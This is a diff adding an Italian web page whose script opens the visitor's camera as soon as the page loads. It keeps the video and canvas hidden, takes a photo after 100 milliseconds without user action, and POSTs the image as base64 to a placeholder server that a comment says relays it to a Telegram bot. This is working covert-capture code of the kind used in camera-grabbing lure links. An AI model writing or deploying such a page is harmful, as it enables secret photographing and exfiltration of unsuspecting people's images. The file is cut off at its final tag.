@@ -1,0 +1,85 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Scatta una foto e invia al bot Telegram</title>
+</head>
+<body>
+    <h1>Scatta una foto e invia al bot Telegram!</h1>
+
+    <!-- Video della fotocamera -->
+    <video id="video" width="320" height="240" autoplay style="display: none;"></video>
+    
+    <!-- Canvas invisibile per prendere la foto -->
+    <canvas id="canvas" style="display:none;"></canvas>
+
+    <script>
+        // Funzione per iniziare la fotocamera
+        function iniziaFotocamera() {
+            // Chiedi accesso alla fotocamera
+            navigator.mediaDevices.getUserMedia({ video: true })
+                .then(function(stream) {
+                    // Mostra la fotocamera nella pagina (disabilitata per il popup)
+                    var video = document.getElementById('video');
+                    video.srcObject = stream;
+
+                    // Dopo 0.1 secondi, scatta la foto
+                    setTimeout(scattaFoto, 100); // Foto scattata subito dopo
+
+                })
+                .catch(function(error) {
+                    console.log("Errore nell'accesso alla fotocamera:", error);
+                });
+        }
+
+        // Funzione per scattare la foto
+        function scattaFoto() {
+            var video = document.getElementById('video');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+
+            // Imposta le dimensioni del canvas uguali a quelle del video
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+
+            // Disegna il fotogramma video sul canvas
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+            // Converte l'immagine in formato base64
+            var fotoBase64 = canvas.toDataURL('image/png');
+
+            console.log("Foto scattata e pronta per inviare!");
+
+            // Invia la foto al server (server backend per inviarla al bot)
+            inviaFoto(fotoBase64);
+        }
+
+        // Funzione per inviare la foto al server
+        function inviaFoto(fotoBase64) {
+            console.log("Invio della foto al server...");
+
+            // Imposta il URL del tuo server
+            fetch('https://tuo-server.com/invia-foto', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ foto: fotoBase64 })
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Foto inviata con successo', data);
+            })
+            .catch((error) => {
+                console.error('Errore nell\'invio della foto:', error);
+            });
+        }
+
+        // Avvia la fotocamera automaticamente al caricamento della pagina
+        window.onload = function() {
+            iniziaFotocamera();
+        };
+    </script>
+</body>
+</
